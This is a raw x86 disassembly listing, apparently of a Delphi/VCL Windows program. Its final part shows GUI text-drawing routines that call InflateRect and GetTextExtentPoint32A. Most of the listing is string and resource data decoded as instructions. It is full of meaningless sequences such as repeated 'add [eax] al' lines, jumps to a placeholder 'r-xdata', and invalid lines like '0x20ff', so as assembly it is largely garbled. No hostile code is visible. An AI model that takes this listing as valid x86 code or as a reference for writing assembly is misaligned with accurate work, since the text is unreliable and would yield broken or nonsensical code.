add [ eax + 0x4f0a0024 ] al
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
outsb
dec edi
jae r-xdata
jns r-xdata
je r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
hlt
adc al 0x2
push ebp
jo r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
push ebx
je r-xdata
dec edi
outsb
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x2430068
and eax 0x6e4f0900
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
sub [ ecx + 0xd80044 ] al
or [ edx ] al
in al dx
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
jb r-xdata
mov esp 0xe400420b
push cs
inc edx
add [ eax + ecx * 2 + 0x40b40044 ] ch
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc esp
jb r-xdata
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
inc esp
outsd
jl r-xdata
test [ bx + di ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4402 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax + 0x44 ] dl
add [ esi + 0x2 ] ch
inc esp
add [ edx + eax ] dl
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
pop esp
mov [ eax + eax + 0x7c ] 0xfa
inc esp
sub_4401da
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x48 ] cl
inc esp
inc esp
add al cl
hlt
sub_4401fe
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
pushfd
dec edx
inc esp
add [ eax ] dl
or al 0x45
add ah dh
dec edx
inc esp
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
add [ esi + ecx + 0x45 ] bh
add [ esi + ecx ] ah
inc ebp
add [ edx + edi + 0x186c0045 ] bl
inc ebp
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add [ eax ] cl
cmp al [ ebp ]
or al 0x49
inc esp
add [ eax ] dl
dec edx
inc esp
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x20ff
sub_44039b
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x336c7443
inc esp
hlt
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax - 0x2d ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] eax
add [ eax ] al
jle r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
pop esp
inc ebp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
jo r-xdata
inc eax
add [ edi ] dl
add bh bh
add [ esp + edi ] ah
inc ebp
adc [ eax ] al
0xff0000 0x44d3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9430690
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
jb r-xdata
push edi
jb r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ esp + edi + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
cmp al 0x45
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0xf8ff0001
cmp eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
adc [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
dec ebx
jns r-xdata
je r-xdata
push edi
jo r-xdata
add [ eax ] al
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f09002d ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
jb r-xdata
add [ eax ] al
sub [ eax ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
outsb
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
push ebx
je r-xdata
push ebp
jo r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
insb
bound edx [ esi + 0x69 ]
outsd
js r-xdata
push ebx
je r-xdata
dec edi
outsb
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x24307b3
inc ebp
outsb
inc esp
sub [ eax ] eax
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
outsb
popad
jb r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
sub [ ecx + 0xd80044 ] al
adc eax 0x47424c54
je r-xdata
jne r-xdata
ja r-xdata
popad
je r-xdata
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
inc esp
jb r-xdata
push 0x65
popad
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + edx + 0x408d0040 ] dl
add [ eax + 0x9 ] bl
insb
dec edi
je r-xdata
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
test [ eax ] cl
inc esp
add [ edx ] cl
insb
bound edx [ ebx + 0x74 ]
popad
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
popad
jb r-xdata
inc esp
outsd
je r-xdata
jb r-xdata
inc ebx
je r-xdata
jb r-xdata
nop
mov [ eax ] cl
or eax [ eax + eax + 0x7c ]
add al [ eax ]
add [ ebp + ebx * 4 + 0x44 ] bh
add ah al
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0x52 ] cl
inc esp
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
enter 0x450d 0x0
test [ edx - 0xdb7ffbf ] cl
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
add [ ecx ] cl
je r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
inc esp
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
je r-xdata
jb r-xdata
lea eax [ eax ]
pop eax
or [ eax + eax + 0x8 ] eax
ja r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
add cl [ eax ]
pop es
add [ eax ] al
outsb
or eax [ eax + eax - 0x2a ]
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
adc [ eax ] al
add ah cl
xchg edx eax
inc esp
add [ eax + edx + 0x408d0040 ] dl
add [ edx + ecx + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx + 0x44 ] bl
add ah ch
or eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xb ] ch
inc esp
add dh dl
inc ebp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
jb r-xdata
jb r-xdata
arpl [ eax + eax - 0x34 ] si
xchg edx eax
inc esp
add [ eax + edx ] bh
inc eax
add [ ecx + edx ] al
inc eax
add [ ebx + 0x4409bcc0 ] cl
add [ eax ] cl
dec edi
bound ebp [ edx + 0x65 ]
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
popad
je r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
xchg esp eax
adc [ eax ] al
popad
je r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc esp
add [ eax ] cl
inc eax
add [ ebp + 0x9580040 ] cl
jne r-xdata
add al 0x44
mov eax eax
push ebx
je r-xdata
outsb
inc esp
add [ ebx ] al
or eax 0x73694c54
je r-xdata
inc esp
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
rol [ eax ] 0x9
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
inc ebp
jbe r-xdata
jb r-xdata
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
mov esp 0x8004409
imul ebp [ esi + 0x67 ] 0x4492cc00
push ebx
je r-xdata
insb
xor [ eax ] eax
xor al 0x53
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
js r-xdata
ja r-xdata
add [ eax - 0xe ] cl
imul ebp [ esi + 0x67 ] 0x746e4907
sub_440ab2
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x4c ] cl
pop edi
inc esp
add al cl
hlt
sub_440c19
mov esp 0x100453c
inc esp
add al bh
inc esp
add [ eax ] ah
push esp
inc esp
add [ esp + edx * 2 + 0x44 ] bh
add [ esp + edx * 2 + 0x44 ] bl
add [ esi ] cl
push esp
inc ebx
jne r-xdata
inc esp
je r-xdata
and al 0x44
add [ eax ] bh
inc ecx
add ah al
mov al [ 0x25340041 ]
inc esp
add [ edx ] cl
inc ecx
add [ eax + 0x25 ] ch
inc esp
add [ edx * 4 - 0x6a9fffbf ] bh
inc ecx
add [ esp + 0x44 ] bh
add ah ch
and al 0x44
add [ eax + ebx * 4 - 0x664fffbf ] bh
inc ecx
add [ 0xffffffff9bb80044 ] cl
inc ecx
add [ esp + ebx * 4 + 0x25ec0041 ] cl
inc esp
add al al
pushfd
inc ecx
add al dh
pushfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] al
add al dh
popfd
inc ecx
add [ eax - 0x1fffbe61 ] cl
lahf
inc ecx
add [ eax + 0x41 ] dh
add [ eax ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
call 0x68444e2d
mov eax [ ecx ]
and [ edi - 0x69e7ffbf ] dl
inc ecx
add [ esp ] ah
inc esp
add [ ecx + ebx * 4 + 0x236c0041 ] ah
inc esp
add [ eax + 0x4004423 ] cl
0x9ea00041 0x41
add [ esp + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
or eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ 0x140044 ] cl
cwde
or al 0x44
insd
dec esp
imul esi [ ebx + 0x74 ] 0x8d786f42
inc eax
add ah ch
or eax [ eax + eax + 0x7 ]
push cs
push esp
inc ebx
jne r-xdata
add [ eax ] al
and al 0xe
inc esp
add [ eax + eax ] dl
add [ eax ] al
jo r-xdata
je r-xdata
add [ eax ] al
add al 0xe9
inc ebx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or eax 0x140044
je r-xdata
add [ eax - 0x6b ] ah
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
inc ecx
add [ eax + 0x40004450 ] dh
dec edi
inc esp
add [ eax + 0x4f ] dl
inc esp
add [ eax - 0xbffbe67 ] dh
push eax
inc esp
add [ eax - 0x73ffbe65 ] bh
pushfd
inc ecx
add [ eax - 0x3fffbbb2 ] ch
pushfd
inc ecx
add al dh
pushfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] al
add [ eax ] bh
push ecx
inc esp
add [ eax - 0x1fffbe61 ] cl
lahf
inc ecx
add [ eax + 0x41 ] dh
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x53786f42
je r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
call 0x68444f39
mov eax [ ecx ]
and [ edi - 0x69e7ffbf ] dl
inc ecx
add al bh
imul ebp [ esi + 0x67 ] r-xdata
xor [ 0x10070044 ] cl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x5c786f42
or al [ eax + eax - 0x20 ]
sahf
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
cmpsb [ esi ] [ edi ]
cld
jmp [ edi + ecx * 4 + 0x5 ]
imul ebp [ esi + 0x67 ] 0x440e3873
add [ edi ] al
andps xmm1 [ ecx + ebp * 2 + 0x73 ]
je r-xdata
dec ebp
inc esp
add [ eax ] bh
inc ecx
add ah al
mov al [ 0x50c00041 ]
inc esp
add [ edx ] cl
inc ecx
add [ eax ] cl
dec esi
inc esp
add [ edx * 4 - 0x6a9fffbf ] bh
inc eax
xor eax [ eax ]
loopne r-xdata
add ah ch
je r-xdata
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
insb
jae r-xdata
push eax
mov edx 0xb9
mov eax esi
call sub_44c948
mov edx 0x69
mov eax esi
outsd
js r-xdata
dec ebx
inc esp
add [ ecx + ebx * 4 + 0x4bdc0041 ] ah
inc esp
add ah cl
dec esp
inc esp
add [ edx + ebx * 4 ] al
inc ecx
add [ eax + 0x4d ] ah
inc esp
add al ah
clc
imul ebp [ esi + 0x67 ] 0x440c9873
add al ch
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x3cbcff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
call sub_44c96c
mov eax esi
test bl bl
je r-xdata
je r-xdata
add [ ebx + 0x53000408 ] ch
push esi
imul ebp [ esi + 0x67 ] 0x440da473
add [ eax + 0x62 ] bl
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44faf4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
add [ ebx + 0x56 ] dl
inc ebx
je r-xdata
call sub_42492c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_424888
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push ebx
push 0x208838b
add [ eax ] al
insb
jae r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
sub_440e60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455750
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_44c948
mov edx 0x69
mov eax esi
call sub_44c96c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_440ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44faf4
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_42492c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_424888
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_440f28
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4412ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_42492c
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_424888
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_44d18c
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_416e34
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_416e34
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x54 ]
call sub_4041e0
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x58 ]
call sub_4043e0
push eax
mov eax edi
call sub_424a0c
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_416e34
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_42420c
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
